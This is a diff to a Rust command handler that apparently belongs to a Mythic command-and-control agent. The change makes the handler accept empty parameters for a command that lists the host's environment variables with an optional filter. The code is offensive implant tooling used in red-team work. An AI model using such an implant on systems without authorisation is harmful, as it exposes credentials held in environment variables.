@@ -3,7 +3,7 @@
 use mythic::{TaskMessage, TaskResponse};
 use serde::Deserialize;
 
-#[derive(Deserialize)]
+#[derive(Deserialize, Default)]
 struct Params {
     /// Optional filter: only show vars containing this key (case-insensitive).
     #[serde(default)]
@@ -11,7 +11,13 @@ struct Params {
 }
 
 pub fn handle(task: &TaskMessage) -> TaskResponse {
-    let params = match serde_json::from_str::<Params>(&task.parameters) {
+    let parameters = task.parameters.trim();
+    let parameters = if parameters.is_empty() {
+        "{}"
+    } else {
+        parameters
+    };
+    let params = match serde_json::from_str::<Params>(parameters) {
         Ok(p) => p,
         Err(e) => return TaskResponse::failed(task.id, &format!("env parse error: {e}")),
     };
